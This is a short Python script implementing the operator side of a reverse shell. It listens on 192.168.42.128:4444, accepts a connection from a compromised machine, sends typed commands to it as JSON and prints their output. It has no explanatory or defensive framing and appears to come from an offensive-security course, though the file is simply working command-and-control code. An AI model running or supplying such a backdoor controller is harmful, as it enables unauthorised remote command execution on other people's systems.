import socket
import json

class Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

        listener.bind((ip, port))
        listener.listen(0)
        print("[+] Waiting for incoming connections.")

        self.connection, address = listener.accept()
        print(f"[+] Got a connection from {address}.")

    def reliable_send(self, data):
        json_data = json.dumps(data.decode() if type(data) == bytes else data)
        self.connection.send(json_data.encode())
        
    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data += self.connection.recv(1024).decode()
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_remotely(self, command):
        self.reliable_send(command)
        return self.reliable_receive()

    def run(self):
        while True:
            command = input(">> ")
            print(self.execute_remotely(command))


my_listener = Listener("192.168.42.128", 4444)
my_listener.run()
